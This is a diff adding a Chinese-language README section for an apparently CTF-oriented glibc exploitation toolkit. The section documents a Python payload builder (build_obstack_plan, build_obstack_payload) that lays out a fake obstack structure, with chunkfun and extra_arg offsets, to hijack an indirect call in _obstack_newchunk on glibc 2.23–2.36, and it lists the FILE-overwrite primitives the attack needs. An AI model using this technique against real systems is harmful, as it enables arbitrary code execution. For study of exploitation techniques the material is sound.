@@ -39,6 +39,106 @@ libio/obprintf.c、libio/vtables.c 与 2.37 stdio-common/printf_buffer_flush.c�
 
 C PoC 使用合法 API 设置回调，所以 API 本身不是漏洞；文件末尾的中文伪代码说明题目侧 fake FILE/obstack 布局。
 
+## Python 离线板子
+
+[`obstack.py`](./obstack.py) 提供两个函数：
+
+```text
+build_obstack_plan    -> 返回 ObstackPlan
+build_obstack_payload -> 返回 fake obstack 的 MemoryWrite 镜像
+```
+
+### 函数用途
+
+描述 `_obstack_newchunk -> chunkfun(extra_arg, new_size)` 最终触发点所需的字段来源。
+
+### 最小使用示例
+
+```python
+from obstack import build_obstack_payload, build_obstack_plan
+
+plan = build_obstack_plan(
+    object_base=0x100000,     # 当前 chunk 起点
+    next_free=0x101000,       # 写指针（= chunk_limit 触发扩容）
+    chunkfun_addr=0x401234,   # 分配回调
+    extra_arg=0x500000,       # callback 第一个参数
+)
+
+# 返回 ObstackPlan 数据类
+print(plan.object_base, plan.next_free, plan.chunk_limit,
+      hex(plan.chunkfun), hex(plan.extra_arg), plan.use_extra_arg)
+
+writes = build_obstack_payload(
+    obstack_addr=0x200000,
+    object_base=0x100000,
+    next_free=0x101000,
+    chunkfun_addr=0x401234,
+    extra_arg=0x500000,
+)
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
+```
+
+### 对应 PoC
+
+- [`poc_chunkfun_sink_2.23_2.36.c`](./poc_chunkfun_sink_2.23_2.36.c)。
+
+### 参数
+
+| 参数 | 含义 |
+|---|---|
+| `object_base` | 当前 obstack chunk 起点。 |
+| `next_free` | 当前写指针；与 `chunk_limit` 相等时扩容立即发生。 |
+| `chunkfun_addr` | `_obstack_newchunk` 间接调用的分配回调。 |
+| `extra_arg` | callback 第一个参数。 |
+| `chunk_limit` | 当前 chunk 上限；省略时取 `next_free`，让扩容立即发生。 |
+
+### 返回对象 `ObstackPlan`
+
+| 字段 | 含义 |
+|---|---|
+| `object_base` | 当前 chunk 起点。 |
+| `next_free` | 当前写指针。 |
+| `chunk_limit` | 当前 chunk 上限。 |
+| `chunkfun` | 分配回调地址。 |
+| `extra_arg` | callback 第一个参数。 |
+| `use_extra_arg` | 固定为 1，表示 chunkfun 带 extra_arg 调用。 |
+
+### 返回对象 `MemoryWrite`
+
+`build_obstack_payload` 返回一个 `MemoryWrite`：
+
+```text
+address = obstack_addr
+data    = 0x70 字节 fake obstack 镜像
+label   = "fake obstack object"
+
+镜像关键字段：
+    +0x38  chunkfun
+    +0x40  extra_arg
+    +0x50  use_extra_arg = 1
+    +0x58  object_base
+    +0x60  next_free
+    +0x68  chunk_limit
+```
+
+### 调用者必须提供
+
+```text
+2.23～2.36 的合法 _IO_obstack_jumps
+能投递 fake _IO_obstack_file 或覆盖 FILE 的原语
+能触发 obstack_printf / flush 的入口
+```
+
+### 函数不负责
+
+```text
+不生成旧 FILE vtable
+不投递 fake _IO_obstack_file
+不触发 printf/flush
+2.37+ 应改用 house_of_snake
+```
+
 ## 迁移与调试
 
 1. 2.24～2.36 让 FILE vtable 指向合法 `_IO_obstack_jumps`；2.23 没有 vtable 白名单，但仍可使用同一表。
